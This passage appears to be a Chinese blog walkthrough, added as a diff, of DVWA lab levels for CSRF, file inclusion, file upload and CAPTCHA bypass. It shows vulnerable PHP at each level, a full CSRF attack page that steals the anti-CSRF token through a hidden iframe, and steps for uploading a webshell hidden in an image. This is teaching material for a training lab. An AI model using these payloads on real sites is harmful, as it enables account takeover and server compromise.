+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
+        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+
+        // Feedback for the user 
+        echo "<pre>Password Changed.</pre>"; 
+    } 
+    else { 
+        // Issue with passwords matching 
+        echo "<pre>Passwords did not match.</pre>"; 
+    } 
+
+    mysql_close(); 
+} 
+
+?>
+<hr>
+<p>我们先对其抓包<br><img src="https://pics6.baidu.com/feed/bf096b63f6246b6063db7560e030c64a500fa218.png?token=3c675db8b5bea99d52b32d66762db004"><br><img src="https://pics5.baidu.com/feed/2fdda3cc7cd98d109809c16c2cf7640879ec90d9.png?token=bf67d2385e4585ff9935704e348aea6e"><br>也就是说，当我们访问<a target="_blank" rel="noopener" href="http://127.0.0.1/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change%E6%88%91%E4%BB%AC%E7%9A%84%E5%AF%86%E7%A0%81%E5%B0%B1%E4%BC%9A%E6%94%B9%E5%8F%98%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E4%BC%AA%E9%80%A0%E8%BF%99%E6%9D%A1%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%8F%91%E9%80%81%E7%BB%99%E5%8F%97%E5%AE%B3%E8%80%85%EF%BC%8C%E5%9C%A8%E4%B8%8D%E7%9F%A5%E4%B8%8D%E8%A7%89%E4%B8%AD%E5%AF%B9%E6%96%B9%E7%9A%84%E5%AF%86%E7%A0%81%E5%B0%B1%E4%BC%9A%E8%A2%AB%E4%BF%AE%E6%94%B9%E3%80%82">http://127.0.0.1/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change我们的密码就会改变，我们可以伪造这条链接，发送给受害者，在不知不觉中对方的密码就会被修改。</a></p>
+<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><h2 id="源代码-7"><a href="#源代码-7" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_GET[ 'Change' ] ) ) { 
+    // Checks to see where the request came from 
+    if( eregi( $_SERVER[ 'SERVER_NAME' ], $_SERVER[ 'HTTP_REFERER' ] ) ) { 
+        // Get input 
+        $pass_new  = $_GET[ 'password_new' ]; 
+        $pass_conf = $_GET[ 'password_conf' ]; 
+
+        // Do the passwords match? 
+        if( $pass_new == $pass_conf ) { 
+            // They do! 
+            $pass_new = mysql_real_escape_string( $pass_new ); 
+            $pass_new = md5( $pass_new ); 
+
+            // Update the database 
+            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
+            $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+
+            // Feedback for the user 
+            echo "<pre>Password Changed.</pre>"; 
+        } 
+        else { 
+            // Issue with passwords matching 
+            echo "<pre>Passwords did not match.</pre>"; 
+        } 
+    } 
+    else { 
+        // Didn't come from a trusted source 
+        echo "<pre>That request didn't look correct.</pre>"; 
+    } 
+
+    mysql_close(); 
+} 
+
+?><h2 id="-5"><a href="#-5" class="headerlink" title=" "></a> </h2><p>可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击。</p>
+<p>过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.153.130）</p>
+<p>我们可以将攻击页面命名为192.168.153.130.html（页面被放置在攻击者的服务器里，这里是10.4.253.2）就可以绕过了</p>
+<p>下面是Burpsuite的截图<br><img src="https://image.3001.net/images/20161031/1477895636890.png!small"></p>
+<p>Referer参数完美绕过过滤规则</p>
+<p><img src="https://image.3001.net/images/20161031/14778956835405.png!small"></p>
+<p>密码修改成功<br><img src="https://image.3001.net/images/20161031/14778957125554.png!small"></p>
+<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><hr>
+<?php 
+
+if( isset( $_GET[ 'Change' ] ) ) { 
+    // Check Anti-CSRF token 
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+
+    // Get input 
+    $pass_new  = $_GET[ 'password_new' ]; 
+    $pass_conf = $_GET[ 'password_conf' ]; 
+
+    // Do the passwords match? 
+    if( $pass_new == $pass_conf ) { 
+        // They do! 
+        $pass_new = mysql_real_escape_string( $pass_new ); 
+        $pass_new = md5( $pass_new ); 
+
+        // Update the database 
+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
+        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+
+        // Feedback for the user 
+        echo "<pre>Password Changed.</pre>"; 
+    } 
+    else { 
+        // Issue with passwords matching 
+        echo "<pre>Passwords did not match.</pre>"; 
+    } 
+
+    mysql_close(); 
+} 
+
+// Generate Anti-CSRF token 
+generateSessionToken(); 
+
+?><h2 id="-6"><a href="#-6" class="headerlink" title=" "></a> </h2><p>可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
+<h2 id="构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。"><a href="#构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。" class="headerlink" title="构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。"></a>构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。</h2><script type="text/javascript">
+
+    function attack()
+
+  {
+
+   document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;
+
+  document.getElementById("transfer").submit(); 
+
+  }
+
+</script>
+
+
+
+<iframe src="http://192.168.153.130/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;">
+
+</iframe>
+
+
+
+<body onload="attack()">
+
+  <form method="GET" id="transfer" action="http://192.168.153.130/dvwa/vulnerabilities/csrf">
+
+   <input type="hidden" name="password_new" value="password">
+
+<pre><code>&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</code></pre>
+   <input type="hidden" name="user_token" value="">
+
+  <input type="hidden" name="Change" value="Change">
+
+   </form>
+
+</body>
+
+<hr>
+<p>攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。</p>
+<h2 id="impossible-2"><a href="#impossible-2" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码-8"><a href="#源代码-8" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_GET[ 'Change' ] ) ) { 
+    // Check Anti-CSRF token 
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+
+    // Get input 
+    $pass_curr = $_GET[ 'password_current' ]; 
+    $pass_new  = $_GET[ 'password_new' ]; 
+    $pass_conf = $_GET[ 'password_conf' ]; 
+
+    // Sanitise current password input 
+    $pass_curr = stripslashes( $pass_curr ); 
+    $pass_curr = mysql_real_escape_string( $pass_curr ); 
+    $pass_curr = md5( $pass_curr ); 
+
+    // Check that the current password is correct 
+    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); 
+    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); 
+    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR ); 
+    $data->execute(); 
+
+    // Do both new passwords match and does the current password match the user? 
+    if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) { 
+        // It does! 
+        $pass_new = stripslashes( $pass_new ); 
+        $pass_new = mysql_real_escape_string( $pass_new ); 
+        $pass_new = md5( $pass_new ); 
+
+        // Update database with new password 
+        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' ); 
+        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR ); 
+        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); 
+        $data->execute(); 
+
+        // Feedback for the user 
+        echo "<pre>Password Changed.</pre>"; 
+    } 
+    else { 
+        // Issue with passwords matching 
+        echo "<pre>Passwords did not match or current password incorrect.</pre>"; 
+    } 
+} 
+
+// Generate Anti-CSRF token 
+generateSessionToken(); 
+
+?><h2 id="-7"><a href="#-7" class="headerlink" title=" "></a> </h2><p>可以看到，Impossible级别的代码要求用户输入原始密码，攻击者在不知道原始密码的情况下，无法进行CSRF攻击。</p>
+<h1 id="第四题File-Inclusion"><a href="#第四题File-Inclusion" class="headerlink" title="第四题File-Inclusion"></a>第四题File-Inclusion</h1><p><img src="https://image.3001.net/images/20161106/14784220172185.png!small"></p>
+<h2 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h2><h2 id="源代码-9"><a href="#源代码-9" class="headerlink" title="源代码"></a>源代码</h2><?php 
+// The page we wish to display 
+$file = $_GET[ 'page' ]; 
+?><h2 id="-8"><a href="#-8" class="headerlink" title=" "></a> </h2><p>我们先点击file1.php效果如下：<br><img src="https://pics4.baidu.com/feed/48540923dd54564e458a3432b8164084d0584f19.png?token=8e0df337e643d14699f8db6f835c1bef"><br>在burp中对其抓包<br><img src="https://pics4.baidu.com/feed/91529822720e0cf3165ae065028e2e19bc09aaca.png?token=d4a6d4ad5105c98fa81a5e9f0778d4cb"><br>读取任意文件测试，我们在D盘新建一个txt构造下面命令：读取d盘下的bbskali.txt文件<br><img src="https://pics2.baidu.com/feed/838ba61ea8d3fd1f21b1fa183a86f91994ca5fa2.png?token=a1414ce9fd591db547742e5071095679"><br>访问远程文件<br><img src="https://pics3.baidu.com/feed/d1a20cf431adcbefca128176bd67f2dba2cc9fef.png?token=d74cdf0e394b5f46d043286cb3c4e6f3"></p>
+<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><hr>
+<p>&lt;php</p>
+<p>//Thepagewewishtodisplay<br>$file=$_GET[‘page’];</p>
+<p>//Inputvalidation<br>$file=str_replace(array(“http://“,”https://“),””,$file);<br>$file=str_replace(array(“../“,”..&quot;“),””,$file);</p>
+<blockquote>
+</blockquote>
+<hr>
+<p>Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</p>
+<p>本地文件包含<br><img src="https://img-blog.csdnimg.cn/20190616173558550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70"></p>
+<h2 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h2><hr>
+<?php 
+// The page we wish to display 
+$file = $_GET[ 'page' ]; 
+// Input validation 
+if( !fnmatch( "file*", $file ) && $file != "include.php" ) { 
+    // This isn't the page we want! 
+    echo "ERROR: File not found!"; 
+    exit; 
+} 
+?><h2 id="-9"><a href="#-9" class="headerlink" title="  "></a>  </h2><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
+<p>本地文件包含<br><img src="https://img-blog.csdnimg.cn/20190616173806526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70"></p>
+<h2 id="impossible-3"><a href="#impossible-3" class="headerlink" title="impossible"></a>impossible</h2><hr>
+<?php 
+// The page we wish to display 
+$file = $_GET[ 'page' ]; 
+// Only allow include.php or file{1..3}.php 
+if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) { 
+    // This isn't the page we want! 
+    echo "ERROR: File not found!"; 
+    exit; 
+} 
+?><h2 id="-10"><a href="#-10" class="headerlink" title=" "></a> </h2><p>Impossible级别的代码彻底杜绝了文件包含漏洞</p>
+<h1 id="第五题-File-Upload"><a href="#第五题-File-Upload" class="headerlink" title="第五题-File-Upload"></a>第五题-File-Upload</h1><p><img src="https://image.3001.net/images/20161108/14785910509354.png!small"></p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h2 id="源代码-10"><a href="#源代码-10" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_POST[ 'Upload' ] ) ) { 
+    // Where are we going to be writing to? 
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
+    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 
+
+    // Can we move the file to the upload folder? 
+    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
+        // No 
+        echo '<pre>Your image was not uploaded.</pre>'; 
+    } 
+    else { 
+        // Yes! 
+        echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
+    } 
+} 
+
+?><h2 id="-11"><a href="#-11" class="headerlink" title=" "></a> </h2><p>上传文件一句话木马<br><img src="https://image.3001.net/images/20161108/14785912161713.png!small"><br>上传成功，并且返回了上传路径<br><img src="https://image.3001.net/images/20161108/1478591243183.png!small"><br>打开中国菜刀，右键添加，</p>
+<p>地址栏填入上传文件所在路径<a target="_blank" rel="noopener" href="http://192.168.153.130/dvwa/hackable/uploads/hack.php%EF%BC%8C">http://192.168.153.130/dvwa/hackable/uploads/hack.php，</a></p>
+<p>参数名（一句话木马口令）为apple。</p>
+<p><img src="https://image.3001.net/images/20161108/14785912718652.png!small"><br>然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。</p>
+<p>可以下载、修改服务器的所有文件。<br><img src="https://image.3001.net/images/20161108/14785913093285.png!small"><br>可以打开服务器的虚拟终端。<br><img src="https://image.3001.net/images/20161108/1478591344486.png!small"></p>
+<h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><hr>
+<?php 
+
+if( isset( $_POST[ 'Upload' ] ) ) { 
+    // Where are we going to be writing to? 
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
+    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 
+
+    // File information 
+    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
+    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
+    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
+
+    // Is it an image? 
+    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) && 
+        ( $uploaded_size < 100000 ) ) { 
+
+        // Can we move the file to the upload folder? 
+        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
+            // No 
+            echo '<pre>Your image was not uploaded.</pre>'; 
+        } 
+        else { 
+            // Yes! 
+            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
+        } 
+    } 
+    else { 
+        // Invalid file 
+        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
+    } 
+} 
+
+?><h2 id="-12"><a href="#-12" class="headerlink" title=" "></a> </h2><p>Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B。</p>
+<p>因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查，尝试修改文件名为hack.png。<br><img src="https://image.3001.net/images/20161108/14785914897497.png!small"><br>抓包。<br><img src="https://image.3001.net/images/20161108/1478591669326![]()!small"><br>可以看到文件类型为image/png，尝试修改filename为hack.php。<br><img src="https://image.3001.net/images/20161108/14785917089423.png!small"><br>上传成功。<br><img src="https://image.3001.net/images/20161108/14785917335700.png!small"><br>上菜刀，获取webshell权限。<br><img src="https://image.3001.net/images/20161108/14785917654899.png!small"></p>
+<h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><h2 id="源代码-11"><a href="#源代码-11" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_POST[ 'Upload' ] ) ) { 
+    // Where are we going to be writing to? 
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
+    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 
+
+    // File information 
+    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
+    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
+    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
+    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 
+
+    // Is it an image? 
+    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) && 
+        ( $uploaded_size < 100000 ) && 
+        getimagesize( $uploaded_tmp ) ) { 
+
+        // Can we move the file to the upload folder? 
+        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { 
+            // No 
+            echo '<pre>Your image was not uploaded.</pre>'; 
+        } 
+        else { 
+            // Yes! 
+            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
+        } 
+    } 
+    else { 
+        // Invalid file 
+        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
+    } 
+} 
+
+?><h2 id="-13"><a href="#-13" class="headerlink" title=" "></a> </h2><p>High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”*.jpg”、”*.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p>
+<p>首先利用copy将一句话木马文件1.php与图片文件1.jpg合并生成hack.jpg，打开可以看到，一句话木马藏到了最后。<br><img src="https://image.3001.net/images/20161108/14785919855138.png!small"><br>顺利通过文件头检查，可以成功上传。<br><img src="https://image.3001.net/images/20161108/14785920131063.png!small"><br>上菜刀，右键添加shell，成功拿到webshell。<br><img src="https://image.3001.net/images/20161108/14785921471182.png!small"></p>
+<h2 id="impossible-4"><a href="#impossible-4" class="headerlink" title="impossible"></a>impossible</h2><hr>
+<?php 
+
+if( isset( $_POST[ 'Upload' ] ) ) { 
+    // Check Anti-CSRF token 
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+
+
+    // File information 
+    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
+    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
+    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
+    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
+    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 
+
+    // Where are we going to be writing to? 
+    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; 
+    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; 
+    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 
+    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); 
+    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 
+
+    // Is it an image? 
+    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) && 
+        ( $uploaded_size < 100000 ) && 
+        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) && 
+        getimagesize( $uploaded_tmp ) ) { 
+
+        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 
+        if( $uploaded_type == 'image/jpeg' ) { 
+            $img = imagecreatefromjpeg( $uploaded_tmp ); 
+            imagejpeg( $img, $temp_file, 100); 
+        } 
+        else { 
+            $img = imagecreatefrompng( $uploaded_tmp ); 
+            imagepng( $img, $temp_file, 9); 
+        } 
+        imagedestroy( $img ); 
+
+        // Can we move the file to the web root from the temp folder? 
+        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { 
+            // Yes! 
+            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>"; 
+        } 
+        else { 
+            // No 
+            echo '<pre>Your image was not uploaded.</pre>'; 
+        } 
+
+        // Delete any temp files 
+        if( file_exists( $temp_file ) ) 
+            unlink( $temp_file ); 
+    } 
+    else { 
+        // Invalid file 
+        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
+    } 
+} 
+
+// Generate Anti-CSRF token 
+generateSessionToken(); 
+
+?><h2 id="-14"><a href="#-14" class="headerlink" title=" "></a> </h2><p>Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
+<h1 id="第六题-Insecure-CAPTCHA"><a href="#第六题-Insecure-CAPTCHA" class="headerlink" title="第六题-Insecure-CAPTCHA"></a>第六题-Insecure-CAPTCHA</h1><p><img src="https://image.3001.net/images/20161110/1478762521859.png!small"></p>
+<h2 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h2><h2 id="源代码-12"><a href="#源代码-12" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) { 
+    // Hide the CAPTCHA form 
+    $hide_form = true; 
+
+    // Get input 
+    $pass_new  = $_POST[ 'password_new' ]; 
+    $pass_conf = $_POST[ 'password_conf' ]; 
+
+    // Check CAPTCHA from 3rd party 
+    $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], 
+        $_SERVER[ 'REMOTE_ADDR' ], 
+        $_POST[ 'recaptcha_challenge_field' ], 
+        $_POST[ 'recaptcha_response_field' ] ); 
+
+    // Did the CAPTCHA fail? 
+    if( !$resp->is_valid ) { 
+        // What happens when the CAPTCHA was entered incorrectly 
+        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
+        $hide_form = false; 
+        return; 
+    } 
+    else { 
+        // CAPTCHA was correct. Do both new passwords match? 
+        if( $pass_new == $pass_conf ) { 
+            // Show next stage for the user 
+            echo " 
+                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre> 
+                <form action=\"#\" method=\"POST\"> 
+                    <input type=\"hidden\" name=\"step\" value=\"2\" /> 
+                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /> 
+                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /> 
+                    <input type=\"submit\" name=\"Change\" value=\"Change\" /> 
+                </form>"; 
+        } 
+        else { 
+            // Both new passwords do not match. 
+            $html     .= "<pre>Both passwords must match.</pre>"; 
+            $hide_form = false; 
+        } 
+    } 
+} 
+
+if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) { 
+    // Hide the CAPTCHA form 
+    $hide_form = true; 
+
+    // Get input 
+    $pass_new  = $_POST[ 'password_new' ]; 
+    $pass_conf = $_POST[ 'password_conf' ]; 
+
+    // Check to see if both password match 
+    if( $pass_new == $pass_conf ) { 
+        // They do! 
+        $pass_new = mysql_real_escape_string( $pass_new ); 
+        $pass_new = md5( $pass_new ); 
+
+        // Update database 
+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
+        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+
+        // Feedback for the end user 
+        echo "<pre>Password Changed.</pre>"; 
+    } 
+    else { 
+        // Issue with the passwords matching 
+        echo "<pre>Passwords did not match.</pre>"; 
+        $hide_form = false; 
+    } 
+
+    mysql_close(); 
+} 
+
+?><h2 id="-15"><a href="#-15" class="headerlink" title=" "></a> </h2><p>服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p>
+<p>首先输入密码，点击Change按钮，抓包：<br><img src="https://image.3001.net/images/20161110/1478762833724![]()!small"><br>修改密码成功：<br><img src="https://image.3001.net/images/20161110/1478762911998.png!small"></p>
+<h2 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h2><h2 id="源代码-13"><a href="#源代码-13" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) { 
+    // Hide the CAPTCHA form 
+    $hide_form = true; 
+
+    // Get input 
+    $pass_new  = $_POST[ 'password_new' ]; 
+    $pass_conf = $_POST[ 'password_conf' ]; 
+
+    // Check CAPTCHA from 3rd party 
+    $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], 
+        $_SERVER[ 'REMOTE_ADDR' ], 
+        $_POST[ 'recaptcha_challenge_field' ], 
+        $_POST[ 'recaptcha_response_field' ] ); 
+
+    // Did the CAPTCHA fail? 
+    if( !$resp->is_valid ) { 
+        // What happens when the CAPTCHA was entered incorrectly 
+        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
+        $hide_form = false; 
+        return; 
+    } 
+    else { 
+        // CAPTCHA was correct. Do both new passwords match? 
+        if( $pass_new == $pass_conf ) { 
+            // Show next stage for the user 
+            echo " 
+                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre> 
+                <form action=\"#\" method=\"POST\"> 
+                    <input type=\"hidden\" name=\"step\" value=\"2\" /> 
+                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /> 
+                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /> 
+                    <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /> 
+                    <input type=\"submit\" name=\"Change\" value=\"Change\" /> 
+                </form>"; 
+        } 
+        else { 
+            // Both new passwords do not match. 
+            $html     .= "<pre>Both passwords must match.</pre>"; 
+            $hide_form = false; 
+        } 
+    } 
+} 
+
+if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) { 
+    // Hide the CAPTCHA form 
+    $hide_form = true; 
+
+    // Get input 
+    $pass_new  = $_POST[ 'password_new' ]; 
+    $pass_conf = $_POST[ 'password_conf' ]; 
+
+    // Check to see if they did stage 1 
+    if( !$_POST[ 'passed_captcha' ] ) { 
+        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>"; 
+        $hide_form = false; 
+        return; 
+    } 
+
+    // Check to see if both password match 
+    if( $pass_new == $pass_conf ) { 
+        // They do! 
+        $pass_new = mysql_real_escape_string( $pass_new ); 
+        $pass_new = md5( $pass_new ); 
+
+        // Update database 
+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
+        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+
+        // Feedback for the end user 
+        echo "<pre>Password Changed.</pre>"; 
+    } 
+    else { 
+        // Issue with the passwords matching 
+        echo "<pre>Passwords did not match.</pre>"; 
+        $hide_form = false; 
+    } 
+
+    mysql_close(); 
+} 
+
+?><h2 id="-16"><a href="#-16" class="headerlink" title=" "></a> </h2><p>可以看到，Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。<br>抓到的包：<br><img src="https://image.3001.net/images/20161110/1478763222683.png!small"><br>更改之后的包：<br><img src="https://image.3001.net/images/20161110/14787632525623.png!small"><br>成功<br><img src="https://image.3001.net/images/20161110/14787632811739.png!small"></p>
+<h2 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h2><hr>
+<?php 
+
+if( isset( $_POST[ 'Change' ] ) ) { 
+    // Hide the CAPTCHA form 
+    $hide_form = true; 
+
+    // Get input 
+    $pass_new  = $_POST[ 'password_new' ]; 
+    $pass_conf = $_POST[ 'password_conf' ]; 
+
+    // Check CAPTCHA from 3rd party 
+    $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], 
+        $_SERVER[ 'REMOTE_ADDR' ], 
+        $_POST[ 'recaptcha_challenge_field' ], 
+        $_POST[ 'recaptcha_response_field' ] ); 
+
+    // Did the CAPTCHA fail? 
+    if( !$resp->is_valid && ( $_POST[ 'recaptcha_response_field' ] != 'hidd3n_valu3' || $_SERVER[ 'HTTP_USER_AGENT' ] != 'reCAPTCHA' ) ) { 
+        // What happens when the CAPTCHA was entered incorrectly 
+        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
+        $hide_form = false; 
+        return; 
+    } 
+    else { 
+        // CAPTCHA was correct. Do both new passwords match? 
+        if( $pass_new == $pass_conf ) { 
+            $pass_new = mysql_real_escape_string( $pass_new ); 
+            $pass_new = md5( $pass_new ); 
+
+            // Update database 
+            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;"; 
+            $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+
+            // Feedback for user 
+            echo "<pre>Password Changed.</pre>"; 
+        } 
+        else { 
+            // Ops. Password mismatch 
+            $html     .= "<pre>Both passwords must match.</pre>"; 
+            $hide_form = false; 
+        } 
+    } 
+
